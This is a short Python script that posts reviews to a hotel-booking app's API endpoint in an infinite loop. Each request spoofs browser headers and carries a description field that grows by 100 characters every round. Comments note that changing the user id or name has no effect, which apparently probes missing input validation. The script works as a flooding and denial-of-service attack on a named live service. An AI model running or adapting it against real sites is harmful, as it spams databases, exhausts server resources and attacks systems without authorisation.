import requests

headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'Connection': 'keep-alive',
    # Already added when you pass json=
    # 'Content-Type': 'application/json',
    'Origin': 'https://smooth-hotel.netlify.app',
    'Referer': 'https://smooth-hotel.netlify.app/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'no-cors',
    'Sec-Fetch-Site': 'cross-site',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
}

json_data = {
    'userid': '62716908e5c1c2bc4745bd1c',   # changing the userid is not affecting
    'description': '',
    'name': 'user', # Changing name does not affect
    'roomid': '6274d29ac86b6c1f6c702f4d',
    'date': '2022-05-27T06:55:49.529Z',
}
iter = 0
while True:
    iter += 1
    json_data["description"] = "{}".format("a"*(iter*100))
    response = requests.post('https://mren-hotel.herokuapp.com/api/reviews/addreview', headers=headers, json=json_data)
    print(json_data, iter)
    print(response.text)
